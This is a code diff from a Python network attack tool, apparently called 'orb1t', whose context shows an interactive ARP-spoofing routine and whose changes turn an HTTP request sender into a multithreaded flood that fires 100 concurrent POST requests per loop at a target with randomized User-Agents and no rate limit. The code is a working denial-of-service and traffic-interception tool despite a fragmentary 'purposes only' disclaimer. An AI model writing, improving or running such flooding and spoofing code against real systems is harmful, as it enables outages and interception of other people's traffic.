@@ -422,8 +422,6 @@ PURPOSES ONLY.
             logging.info(message)
 
 
-
-
     def interactive_arp_spoofing(self):
         target_ip = input(Fore.YELLOW + "Enter target IP address: ")
         gateway_ip = input(Fore.YELLOW + "Enter gateway IP address: ")
@@ -457,26 +455,11 @@ PURPOSES ONLY.
         except Exception as e:
             print(Fore.RED + f"Error during ARP spoofing: {e}")
 
-    def send_http_requests(self, target_ip, payload):
-
-     user_agents_file = 'src/user-agents.txt'
-     user_agents = []
-
-
-     if os.path.exists(user_agents_file):
-         with open(user_agents_file, 'r') as file:
-            user_agents = [line.strip() for line in file if line.strip()]
-     else:
-        self.log(Fore.RED + "User-Agent file not found. Default User-Agents will be used.")
-
-     while self.running:
+    def send_single_request(self, target_ip, payload, user_agent):
         try:
-    
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+                sock.settimeout(2)  # Set a timeout for the socket
                 sock.connect((target_ip, self.settings["port"]))
-                
-  
-                user_agent = random.choice(user_agents) if user_agents else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"
 
                 headers = {
                     "User-Agent": user_agent,
@@ -484,21 +467,38 @@ PURPOSES ONLY.
                     "Connection": "keep-alive",
                 }
 
-            
                 request = f"POST / HTTP/1.1\r\nHost: {target_ip}\r\n" + \
                           ''.join(f"{key}: {value}\r\n" for key, value in headers.items()) + \
                           f"Content-Length: {len(payload)}\r\n\r\n{payload}"
 
-       
                 sock.sendall(request.encode())
-                
                 with self.lock:
                     self.packet_count += 1
                 self.log(Fore.MAGENTA + f"Sent HTTP request to {target_ip}:{self.settings['port']}")
-            self.report_packets()
-            time.sleep(self.settings["rate_limit"])
         except Exception as e:
             self.log(Fore.RED + f"HTTP Error: {e}")
+
+    def send_http_requests(self, target_ip, payload):
+        user_agents_file = 'src/user-agents.txt'
+        user_agents = []
+
+        if os.path.exists(user_agents_file):
+            with open(user_agents_file, 'r') as file:
+                user_agents = [line.strip() for line in file if line.strip()]
+        else:
+            self.log(Fore.RED + "User-Agent file not found. Default User-Agents will be used.")
+
+        while self.running:
+            threads = []
+            for _ in range(100): 
+                user_agent = random.choice(user_agents) if user_agents else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"
+                thread = threading.Thread(target=self.send_single_request, args=(target_ip, payload, user_agent))
+                threads.append(thread)
+                thread.start()
+            
+           
+            for thread in threads:
+                thread.join()
 
 if __name__ == "__main__":
     tool = orb1t()
